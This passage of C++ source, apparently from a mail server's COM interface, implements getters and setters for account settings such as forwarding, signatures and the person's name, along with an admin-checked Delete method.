      *pVal = object_->GetForwardKeepOriginal() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardKeepOriginal(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardKeepOriginal(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardAbortSpamFlagged(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardAbortSpamFlagged() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardAbortSpamFlagged(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardAbortSpamFlagged(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignatureEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetEnableSignature() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignatureEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetEnableSignature(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignaturePlainText(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetSignaturePlainText().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignaturePlainText(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSignaturePlainText(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignatureHTML(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetSignatureHTML().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignatureHTML(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSignatureHTML(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PersonFirstName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetPersonFirstName().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_PersonFirstName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetPersonFirstName(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PersonLastName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetPersonLastName().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_PersonLastName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetPersonLastName(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_LastLogonTime(VARIANT *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::DateTime dt = Time::GetDateFromSystemDate(object_->GetLastLogonTime());
      
      *pVal  = dt.GetVariant();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::Delete()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      if (!parent_collection_)
         return PersistentAccount::DeleteObject(object_) ? S_OK : S_FALSE;
   
      parent_collection_->DeleteItemByDBID(object_->GetID());
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

